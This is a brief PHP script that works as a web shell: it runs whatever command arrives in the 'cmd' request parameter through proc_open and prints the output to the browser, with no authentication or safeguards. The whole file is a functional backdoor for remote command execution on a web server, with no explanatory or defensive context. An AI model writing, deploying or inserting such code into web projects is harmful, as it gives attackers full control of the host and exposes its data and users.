<?php

if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];

    if (function_exists('proc_open')) {
        $descriptors = [
            0 => ['pipe', 'r'], 
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w'],
        ];

        $process = proc_open($cmd, $descriptors, $pipes);
        if (is_resource($process)) {
            echo "<pre>" . stream_get_contents($pipes[1]) . "</pre>";
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        } else {
            echo "Failed to execute command.";
        }
    } else {
        echo "No command.";
    }
} else {
    echo "No command.";
}
?>